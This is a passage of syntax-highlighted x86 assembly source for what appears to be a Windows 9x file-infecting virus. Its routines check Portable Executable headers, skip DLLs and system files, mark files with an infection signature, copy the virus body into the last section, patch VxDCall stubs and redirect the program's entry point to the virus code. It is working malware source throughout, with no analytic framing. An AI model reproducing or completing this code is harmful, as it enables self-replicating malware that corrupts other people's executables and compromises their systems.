                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetST</span><span class="sc4">&amp;</span><span class="sc5">ReadFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">InfectHandleErr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectHandleErr</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_inhs</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.Signature</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectHandleErr</span><span class="sc0"> </span><span class="sc1">; chkecks for 'PE' sign</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectPEXE</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">InfectHandleOk</span><span class="sc0">
</span><span class="sc5">InfectHandleErr</span><span class="sc4">:</span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc5">CFbit</span><span class="sc0">
</span><span class="sc5">InfectHandleOk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; infect Portable Executable file by handle</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc5">InfectPEXE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.FileHeader.Machine</span><span class="sc4">],</span><span class="sc0"> \
                          </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">    </span><span class="sc1">; checks for 386 platform</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.FileHeader.</span><span class="sc0"> \
                                                            </span><span class="sc5">Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                           </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">       </span><span class="sc1">; checks for dll or system file</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                           </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.Magic</span><span class="sc4">],</span><span class="sc0"> \
                          </span><span class="sc5">IMAGE_NT_OPTIONAL_HDR_MAGIC</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                            </span><span class="sc5">Subsystem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SubsystemOK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_CUI</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">   </span><span class="sc1">; neither GUI nor CUI, bye!</span><span class="sc0">
</span><span class="sc5">SubsystemOK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.FileHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.FileHeader.</span><span class="sc0"> \
                                </span><span class="sc5">SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Signature</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">FileHeader</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.eh.eh_neh_ofs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe.pe_ish</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetST</span><span class="sc4">&amp;</span><span class="sc5">ReadFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">SectionAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.Misc.VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; remainder?</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">SizeOfImage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.Misc.VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">CheckFileSize</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CheckFileSize</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">InfectPExeErr</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pe_ish</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.SectionCharacteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SCN_CNT_UNINITIALIZED_DATA</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                            </span><span class="sc5">IMAGE_SCN_MEM_16BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfectPExeErr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.InfectedSign</span><span class="sc4">],</span><span class="sc5">infected_sign</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_last</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">


                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_delta2</span><span class="sc0">
</span><span class="sc5">_delta2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">_delta2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.VirData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VxDCall_tbl_size</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">patch_VxDCall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc5">VxDCall_tbl</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+(</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">20cdh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">patch_VxDCall</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hdat</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">hdat</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.eh.eh_checksum</span><span class="sc4">],</span><span class="sc5">infected_sign</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">vir_file_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.Misc.VirtualSize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                       </span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.VirData</span><span class="sc4">+</span><span class="sc5">vir_entry_point</span><span class="sc4">-</span><span class="sc0"> \
                                                              </span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">SectionAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                         </span><span class="sc5">SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_inhs.OptionalHeader.</span><span class="sc0"> \
                                                             </span><span class="sc5">FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.Misc.VirtualSize</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc1">;div     ecx</span><span class="sc0">
               </span><span class="sc1">;cmp     edx,1</span><span class="sc0">
               </span><span class="sc1">;cmc</span><span class="sc0">
               </span><span class="sc1">;adc     eax,0</span><span class="sc0">
               </span><span class="sc1">;mul     ecx</span><span class="sc0">
               </span><span class="sc1">; for test bugs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

